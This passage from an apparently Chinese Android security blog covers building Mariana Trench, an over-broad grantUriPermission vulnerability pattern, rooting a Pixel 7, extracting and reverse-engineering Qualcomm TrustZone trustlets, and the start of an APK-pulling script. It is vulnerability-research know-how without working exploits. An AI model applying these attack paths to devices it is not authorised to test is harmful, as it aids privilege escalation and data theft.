&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br><span class="line">brew update</span><br><span class="line">brew upgrade</span><br></pre></td></tr></table></figure><p>2、安装cmake zlib jsoncpp re2 googletest<br>官方的指导原本是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew install cmake zlib boost jsoncpp re2</span><br><span class="line">brew install googletest --build-from-source # The package is currently broken.</span><br><span class="line">export CMAKE_PREFIX_PATH=/home/linuxbrew/.linuxbrew/opt/jsoncpp:/home/linuxbrew/.linuxbrew/opt/zlib</span><br></pre></td></tr></table></figure><p>这里有两个坑，第一个是boost使用brew安装的话，后面在编译redex的时候会报以下错误：</p><img src="/2023/06/16/mariana-trench-build/boost-error.png" class title="boost build error"><p>解决方法：<br>源码编译最新的boost，可以参考这个<a href="https://blog.csdn.net/ccf19881030/article/details/114788682">博客</a><br>注意：1）都使用sudo切换到root执行 2）设置–eprefix&#x3D;&#x2F;usr<br>第二个坑是源码安装googletest，其实不必要，不需要指定 –build-from-source<br>所以在通过aptz安装boost之后，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install cmake zlib googletest jsoncpp re2</span><br><span class="line">export CMAKE_PREFIX_PATH=/home/linuxbrew/.linuxbrew/opt/jsoncpp:/home/linuxbrew/.linuxbrew/opt/zlib</span><br></pre></td></tr></table></figure><p>3、源码编译fmt<br>随便找一个目录，然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fmtlib/fmt.git</span><br><span class="line">git checkout 7.1.3</span><br><span class="line">mkdir fmt/build</span><br><span class="line">cd fmt/build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>官方指导使用的是8.1.1,但是在编译的时候报了以下错误：</p><img src="/2023/06/16/mariana-trench-build/fmt-error.png" class title="fmt build error"><h3 id="编译mariana-trench"><a href="#编译mariana-trench" class="headerlink" title="编译mariana trench"></a>编译mariana trench</h3><p>1、首先通过git下载最新的mariana trench源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/facebook/mariana-trench.git</span><br></pre></td></tr></table></figure><p>2、编译mariana-trench依赖的redex<br>redex是facebooki开源的一个Android代码优化框架，而这里，mariana trench主要用该框架获取APK的代码调用图。<br>进入刚下载的mariana trench目录，并下载redex的a源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd mariana-trench</span><br><span class="line">git clone https://github.com/facebook/redex.git</span><br></pre></td></tr></table></figure><p>设置redex的编译安装目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MT_INSTALL_DIRECTORY=&quot;$PWD/install&quot;</span><br></pre></td></tr></table></figure><p>开始编译并安装redex：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd redex</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=&quot;$MT_INSTALL_DIRECTORY&quot; ..</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>如果这一步没有问题，则可以开始编译mariana trench了，如果出现问题，一般是依赖不正确，可以尝试使用brew先卸载相应的包，然后使用apt安装。<br>比如re2,可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libre2-dev</span><br></pre></td></tr></table></figure><p>代替brew re2。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd ../..  # 返回mariana trench的根目录</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DREDEX_ROOT=&quot;$MT_INSTALL_DIRECTORY&quot; -DCMAKE_INSTALL_PREFIX=&quot;$MT_INSTALL_DIRECTORY&quot; ..</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="安装mariana-trench"><a href="#安装mariana-trench" class="headerlink" title="安装mariana trench"></a>安装mariana trench</h2><p>切换到mariana trench根目录，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip #如果还没有安装pip，请执行该命令</span><br><span class="line">python3 scripts/setup.py \</span><br><span class="line">  --binary &quot;$MT_INSTALL_DIRECTORY/bin/mariana-trench-binary&quot; \</span><br><span class="line">  --pyredex &quot;$MT_INSTALL_DIRECTORY/bin/pyredex&quot; \</span><br><span class="line">  install</span><br></pre></td></tr></table></figure><p>执行完以上命令后，如果在任意目录下，执行mariana-trench –verison提上没有找打命令，请将当期用户目录：&#x2F;home&#x2F;%当前用户名%&#x2F;.local&#x2F;bin添加到PATH环境变量。</p><h2 id="定制mariana-trench"><a href="#定制mariana-trench" class="headerlink" title="定制mariana trench"></a>定制mariana trench</h2><p>当定制了mariana trench的时候，发生源码更改，可以在build目录下，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mariana-trench --help</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到问题解决问题不放弃，另外Google总算能给我们一些提示，同时，不要忘了在源码的issues上看看别人有没有遇到相同的问题。</p><p>更新2023.06.19：<br>还有一种方法：使用最新的ubuntu 22.04版本，</p><img src="/2023/06/16/mariana-trench-build/ubuntu_version.png" class title="ubuntu version"><p>然后按照官方的指导进行构建（fmt版本我没有试过8.1.1,而是使用7.1.3版本），也可以顺利构建mariana trench。<br>GLIBC的版本正好是2.35（ldd –version）。其它非2.35版本的GLIBC都可能会报各种找不到符号的链接错误。</p><img src="/2023/06/16/mariana-trench-build/succ.png" class title="build succ">]]></content>
      
      
      <categories>
          
          <category> 工具脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> mariana trench </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不恰当动态授权grantUriPermission导致的漏洞</title>
      <link href="/2023/06/12/grantUriPermission-attack/"/>
      <url>/2023/06/12/grantUriPermission-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Android的应用沙盒"><a href="#Android的应用沙盒" class="headerlink" title="Android的应用沙盒"></a>Android的应用沙盒</h2><p>在Android操作系统中，每一个应用都会在安装的时候分配一个独一无二的用户ID–UID，然后每个应用都会在各自的进程中运行。Android利用分配给应用的UID设置一个内核级别的应用沙盒（所以，如果能获得内核权限，应用沙盒机制自然就失效了），内核利用Linux安全机制（比如DAC，MAC）对应用和系统之间进行保护，默认应用之间不能相互访问。<br>详细可以看Android官网上的<a href="https://source.android.com/docs/security/app-sandbox?hl=zh-cn">介绍</a></p><img src="/2023/06/12/grantUriPermission-attack/android-sandbox.png" class title="android-sandbox"><h2 id="Android应用之间的文件共享"><a href="#Android应用之间的文件共享" class="headerlink" title="Android应用之间的文件共享"></a>Android应用之间的文件共享</h2><p>但，毫无疑问，应用之间必然存在文件共享访问的需求。比如A应用请求图库打开一张图片，请求播放器播放一个视频文件等等。在这种情况下，授权应用需要将文件–通常对应一个Uri的读权限或者写权限授予被授权的应用。根据最小授权的原则，授权应用应该仅授予目标应用相应的权限（读或者写），并且在事务完成后取消授权。<br>因此，Android在安全最佳实践中，提供的建议<a href="https://developer.android.com/topic/security/best-practices#java">如下</a>:</p><img src="/2023/06/12/grantUriPermission-attack/granturipermission-best_practices.png" class title="android-grantUriPermission-best-practices"><p>原因是通过Intent的addFlag设置的读写权限属于一次性授权，事务完成后授权自动取消，从而保证了最小授权。</p><h2 id="grantUriPermission漏洞模式"><a href="#grantUriPermission漏洞模式" class="headerlink" title="grantUriPermission漏洞模式"></a>grantUriPermission漏洞模式</h2><p>与使用Intent的addFlags一次性授权相对应的是使用<a href="https://developer.android.com/reference/android/content/Context#grantUriPermission(java.lang.String,%20android.net.Uri,%20int)">grantUriPermission</a>函数进行持久授权</p><img src="/2023/06/12/grantUriPermission-attack/android-grantUriPermission.png" class title="android-grantUriPermission"><p>第一个参数是被授权的应用的包名，第二个参数是被授权的文件的Uri，第三个参数是具体的授权方式：读，写，同时同时具有读写权限。<br>从函数的参数可以看到，如果攻击者可以控制第一个参数，那么就可以获得了文件的读写权限。这可能包括以下几种情况：<br>1）包名是从外部可被攻击者控制的输入传入，比如导出的组件（四大组件），webView等<br>   进一步可能存在两种情况：1是包名完全从外部可控输入，2是包名的不完整校验导致绕过。比如使用startWith，endWith，contain等不安全的字符校验。<br>2）授权的包名当前系统中不存在，因此攻击者可以伪造该包名，从而获得文件的读写权限。<br>3）最常见的一种，就是通过隐式Intent查询当前系统满足能处理该Intent的包，然后授予这些应用授权。<br>   <img src="/2023/06/12/grantUriPermission-attack/grantUriPermission-bug-model.png" class title="grantUriPermission-bug"><br>   这种授权方式，明显属于授权范围过大。攻击者只需要定义一个Activity，然后Intent-filter设置Action是android.intent.action.SEND就可以获得文件的读写权限。<br>   虽然，这种情况下，通常需要用户交互，而且Uri获取的确困难，因此CVSS打分通常无法达到7.0以上，仅属于一般问题。但是，如果Uri是有规律，可预测的（哪怕是遍历沙盒的文件），CVSS打分也将达到7.0以上，属于严重安全问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于Android开发而言，不建议使用grantUriPermission进行授权，推荐使用Intent的addFlags进行一次性授权，防止出现授权过大的安全风险。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> grantUriPermission </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pixel 7/pro的root过程</title>
      <link href="/2023/05/31/root-pixel7/"/>
      <url>/2023/05/31/root-pixel7/</url>
      
        <content type="html"><![CDATA[<h2 id="需要root-pixel-7-x2F-pro的背景"><a href="#需要root-pixel-7-x2F-pro的背景" class="headerlink" title="需要root pixel 7&#x2F;pro的背景"></a>需要root pixel 7&#x2F;pro的背景</h2><p>在很多情况下，我们可能需要获取pixel 7&#x2F;pro的root权限，以便获取普通shell权限无法获取得到的信息，比如TA的二进制文件，修改系统配置，切换用户权限进行测试等等。<br>以下是记录一下root的过程，其实没有什么技术含量，烂笔头好过好脑袋而已。</p><h2 id="解锁OEM"><a href="#解锁OEM" class="headerlink" title="解锁OEM"></a>解锁OEM</h2><p>1、确定打开了开发者模式，并且OEM unlocking 处于打开状态<br>2、adb 授权后，通过adb reboot bootloader，进入fastboot模式<br>3、进入fastboot模式后，输入：<br>   fastboot flashing unlock<br>   在这个过程，可能会遇到一个错误：<br>   <img src="/2023/05/31/root-pixel7/no-permission.png" class title="no-permission"><br>   这种情况下，可能是fastboot不是通过apt安装，而是通过环境变量执行了自行下载的fastboot路径。<br>   解决方法：</p>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root:root fastboot</span><br><span class="line">sudo chmod +s fastboot</span><br></pre></td></tr></table></figure><h2 id="安装Magisk"><a href="#安装Magisk" class="headerlink" title="安装Magisk"></a>安装Magisk</h2><p>我们的目的是通过Magisk来获取root权限（好处是可以随时撤销授权），为了安全着想，建议通过<a href="https://github.com/topjohnwu/Magisk/releases">github官网</a>上下载最新版本的apk。<br>然后通过adb install直接安装</p><h2 id="获取init-boot-img文件"><a href="#获取init-boot-img文件" class="headerlink" title="获取init_boot.img文件"></a>获取init_boot.img文件</h2><p>从android 13开始，通过Magisk获取root权限所使用的引导文件不再是boot.img，而是init_boot.img<br>可以通过google的<a href="https://developers.google.com/android/images#cheetah">官网</a>下载相应版本的zip包。<br>什么是相应版本？<br>通过Setting &gt; About phone &gt; Build number可以看到当前对版本构建编号，然后在以上连接找对应对连接，比如TQ2A.230505.002，如果选择错版本，可能会变砖哦。</p><h2 id="push-init-boot-img到手机上"><a href="#push-init-boot-img到手机上" class="headerlink" title="push init_boot.img到手机上"></a>push init_boot.img到手机上</h2><p>解压上一步骤的压缩包（解压两次，直到找到init_boot.img文件），然后通过adb push到手机上，比如：<br>adb push init_boot.img &#x2F;sdcard&#x2F;Download</p><h2 id="通过Magisk获取init-boot-img的补丁镜像文件"><a href="#通过Magisk获取init-boot-img的补丁镜像文件" class="headerlink" title="通过Magisk获取init_boot.img的补丁镜像文件"></a>通过Magisk获取init_boot.img的补丁镜像文件</h2><p>在Magisk界面上，选择Install，然后选择刚上传的init_boot.img文件，开始patch<br>最后会在相同目录下产生一个patch的镜像文件，通过adb pull拉取回本地</p><h2 id="刷补丁镜像"><a href="#刷补丁镜像" class="headerlink" title="刷补丁镜像"></a>刷补丁镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flash init_boot_a xxx_patch.img</span><br><span class="line">fastboot flash init_boot_b xxx_patch.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><h2 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h2><p>当手机重启后，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure><p>输入su命令后，Magisk界面上会弹出授权请求对话框，点击grant即可。</p><img src="/2023/05/31/root-pixel7/root.png" class title="root">]]></content>
      
      
      <categories>
          
          <category> 技术技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>trustzone安全系列之TA逆向分析</title>
      <link href="/2023/05/30/trustzone-security-reverse/"/>
      <url>/2023/05/30/trustzone-security-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="进入trustzone安全世界"><a href="#进入trustzone安全世界" class="headerlink" title="进入trustzone安全世界"></a>进入trustzone安全世界</h2><p>最近在尝试寻找提权的漏洞，发现了一个比较有意思的博客：<a href="https://tamirzb.com/attacking-android-kernel-using-qualcomm-trustzone">通过高通的trustzone攻击并获得手机的root权限</a>，简单来说，就是攻击者具有了Android侧的system权限（这通常不会是太大的问题，因为业界已经暴露了很多可以获得system权限的漏洞，比如Parcel mismatch系列，也即是反序列化漏洞），然后利用system权限调用TEE上的TA（很多博客也将TA叫做trustlet，含义都一样，都是表示运行在安全世界TEE内核之上的应用）的任意物理地址读写，从而获得Android侧的root权限。</p><p>这的确是一个新颖的思路，以前我们的攻击思路都是：先攻破android侧应用，提权到system权限，然后利用system攻击驱动，获得root权限，再根据root权限攻击安全世界的TA，最后通过TA攻击TEE内核，而以上博客的作者直接通过system攻击TA，反过来攻击获取android的root的权限。这其实是利用了安全世界可以读写物理内存的事实（安全世界虽然也有虚拟内存的说法，但其实虚拟内存仅仅是物理内存的一一对应的镜像）。</p><p>有了这个思路，那么就可以开始安全世界的漏洞挖掘之旅了。</p><h2 id="获取TA的二进制文件"><a href="#获取TA的二进制文件" class="headerlink" title="获取TA的二进制文件"></a>获取TA的二进制文件</h2><p>在大部分的情况下，我们是无法获得TA的源码的，因此，我们通常需要逆向分析来进行漏洞挖掘。<br>通常情况，TA的二进制文件都会存放在手机的vendor&#x2F;firmware，vendor&#x2F;firmware_mnt目录下：</p><img src="/2023/05/30/trustzone-security-reverse/pixel4xl_TAs.png" class title="pixel4XL_TAs"><p>但是，对于非root手机，是无法访问vendor&#x2F;firmware_mnt目录的，如果需要一个完备的TA二进制n文件，建议使用<a href="https://github.com/topjohnwu/Magisk">Magisk</a>工具获得手机的root权限（这其实与我们对研究目标似乎有点冲突，毕竟我们对目标本来就是为了获得root权限，但这里我们仅是为了获得分析对象的二进制文件：假设攻击者总能获得TA的二进制文件是合理的，比如升级包提取、利用其他漏洞dump手机内存等）。<br>知道了TA的位置后，就可以使用adb pull将TA的二进制文件拉取到本地，以便后续的分析。</p><h2 id="获取TA的elf格式文件"><a href="#获取TA的elf格式文件" class="headerlink" title="获取TA的elf格式文件"></a>获取TA的elf格式文件</h2><p>在上节中，我们拉取了TA的二进制文件，但是发现很多文件都是XXX.b01,XXX.b02,…,XXX.mdt，这其实就是高通TA的一种存储方式：</p><img src="/2023/05/30/trustzone-security-reverse/trustlet_structures.png" class title="TA structure"><p>我们可以参考<a href="https://github.com/pandasauce/unify_trustlet/blob/master/unify_trustlet.py">unify_trustlet</a>提取elf文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Reading the arguments</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;USAGE: &lt;BITNESS&gt; &lt;TRUSTLET_DIR&gt; &lt;TRUSTLET_NAME&gt; &lt;OUTPUT_FILE_PATH&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    bitness = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    trustlet_dir = sys.argv[<span class="number">2</span>]</span><br><span class="line">    trustlet_name = sys.argv[<span class="number">3</span>]</span><br><span class="line">    output_file_path = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bitness == <span class="number">64</span>):</span><br><span class="line">        ELF_HEADER_SIZE = <span class="number">0x40</span></span><br><span class="line">        E_PHNUM_OFFSET = <span class="number">0x38</span></span><br><span class="line">        PHDR_SIZE = <span class="number">0x38</span></span><br><span class="line">        P_FILESZ_OFFSET = <span class="number">0x20</span></span><br><span class="line">        P_OFFSET_OFFSET = <span class="number">0x8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ELF_HEADER_SIZE = <span class="number">0x34</span></span><br><span class="line">        E_PHNUM_OFFSET = <span class="number">0x2C</span></span><br><span class="line">        PHDR_SIZE = <span class="number">0x20</span></span><br><span class="line">        P_FILESZ_OFFSET = <span class="number">0x10</span></span><br><span class="line">        P_OFFSET_OFFSET = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reading the ELF header from the &quot;.mdt&quot; file</span></span><br><span class="line">    mdt = <span class="built_in">open</span>(os.path.join(trustlet_dir, <span class="string">&quot;%s.mdt&quot;</span> % trustlet_name), <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    elf_header = mdt.read(ELF_HEADER_SIZE)</span><br><span class="line">    phnum = struct.unpack(<span class="string">&quot;&lt;H&quot;</span>, elf_header[E_PHNUM_OFFSET:E_PHNUM_OFFSET + <span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Found %d program headers&quot;</span> % phnum)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reading each of the program headers and copying the relevant chunk</span></span><br><span class="line">    output_file = <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, phnum):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reading the PHDR</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Reading PHDR %d&quot;</span> % i)</span><br><span class="line">        phdr = mdt.read(PHDR_SIZE)</span><br><span class="line">        p_filesz = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, phdr[P_FILESZ_OFFSET:P_FILESZ_OFFSET + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        p_offset = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, phdr[P_OFFSET_OFFSET:P_OFFSET_OFFSET + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Size: 0x%08X, Offset: 0x%08X&quot;</span> % (p_filesz, p_offset))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p_filesz == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Empty block, skipping&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># There&#x27;s no backing block</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Copying out the data in the block</span></span><br><span class="line">        block = <span class="built_in">open</span>(os.path.join(trustlet_dir, <span class="string">&quot;%s.b%02d&quot;</span> % (trustlet_name, i)), <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        output_file.seek(p_offset, <span class="number">0</span>)</span><br><span class="line">        output_file.write(block)</span><br><span class="line"></span><br><span class="line">    mdt.close()</span><br><span class="line">    output_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="开始逆向分析"><a href="#开始逆向分析" class="headerlink" title="开始逆向分析"></a>开始逆向分析</h2><p>如果以上一切顺利的话，就可以正常获得了TA的elf文件，然后，可以上IDA了。<br>我们非常关心GP API：TA_InvokeCommandEntryPoint的实现，这是android侧可以调用TA的一个关键接口</p><img src="/2023/05/30/trustzone-security-reverse/TA_interface.png" class title="TA interface"><p>但是，由GP的<a href="https://globalplatform.org/wp-content/uploads/2018/06/GPD_TEE_Internal_Core_API_Specification_v1.1.2.50_PublicReview.pdf">文档</a>得知：</p><img src="/2023/05/30/trustzone-security-reverse/GPTA_interface.png" class title="GP TA interface"><p>该接口的参数中，最重要的是最后一个参数：TEE_Param</p><img src="/2023/05/30/trustzone-security-reverse/TEE_params.png" class title="TEE_param"><p>所以，我们希望IDA能够解析这个结构体，这样就可以方便我们跟踪该参数在TA里的处理过程。<br>那么，可以这样在IDA里添加这个自定义的结构体<br>1、View –&gt; Open subviews –&gt;Local types<br>2、右键，选择Insert<br>   <img src="/2023/05/30/trustzone-security-reverse/localtype_insert.png" class title="insert local types"><br>3、在弹出的对话框输入：</p>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(8)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">void</span>* buffer;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    &#125;memref;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span> a;</span><br><span class="line">        <span class="type">uint32_t</span> b;</span><br><span class="line">    &#125;value;</span><br><span class="line">&#125;TEE_Param;</span><br></pre></td></tr></table></figure><img src="/2023/05/30/trustzone-security-reverse/customize_tee_param.png" class title="customize tee_param"><p>4、在Local types中选择刚才定义的结构体，右键选择Synchronize to idb</p><img src="/2023/05/30/trustzone-security-reverse/Synchronize_to_idb.png" class title="Synchronize to idb"><p>5、回到sub_1180,选择最后一个参数的类型——int64,右键选择convert to struct</p><img src="/2023/05/30/trustzone-security-reverse/convert_to_struct.png" class title="convert_to_struct"><p>弹出的对话框选择TEE_Param<br>其他函数也是这样修改参数类型<br>最后，就可以比较容易分析入参是如何传入并被处理的：</p><img src="/2023/05/30/trustzone-security-reverse/convert_result.png" class title="convert_to_struct"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上仅仅是进入etrustzon安全世界漏洞挖掘的一小步而已，但万事开头难，也总算打开了头，后续就可以参考TEE的漏洞模式进行挖掘了。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> trustzone </tag>
            
            <tag> 逆向分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过python脚本一键获取手机中的APK</title>
      <link href="/2023/05/17/get-apks-python-script/"/>
      <url>/2023/05/17/get-apks-python-script/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在移动终端的漏洞挖掘中，通常需要对系统的APK进行逆向分析，而在使用jadx、GDA进行逆向分析之前，首先得将APK的安装包拖到本地。</p><h2 id="利用脚本一键获取手机中的APK安装包"><a href="#利用脚本一键获取手机中的APK安装包" class="headerlink" title="利用脚本一键获取手机中的APK安装包"></a>利用脚本一键获取手机中的APK安装包</h2><p>前提条件：<br>    不管是Window还是Linux系统，首先确保adb工具已经安装并且在系统环境变量中。如果是首次使用adb连接手机，确认手机开启了开发者调试模式并且进行了连接授权。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAPKs</span>():</span><br><span class="line">    packages = subprocess.Popen(<span class="string">&#x27;adb shell pm list package -f&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    return_code = packages.poll()</span><br><span class="line">    package_list = []</span><br><span class="line">    <span class="keyword">while</span> return_code <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        line = packages.stdout.readline()</span><br><span class="line">        return_code = packages.poll()</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            package_list.append(line)</span><br><span class="line">    <span class="keyword">return</span> package_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pull_apk_from_device</span>(<span class="params">package_list, out_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> package_list <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> package <span class="keyword">in</span> 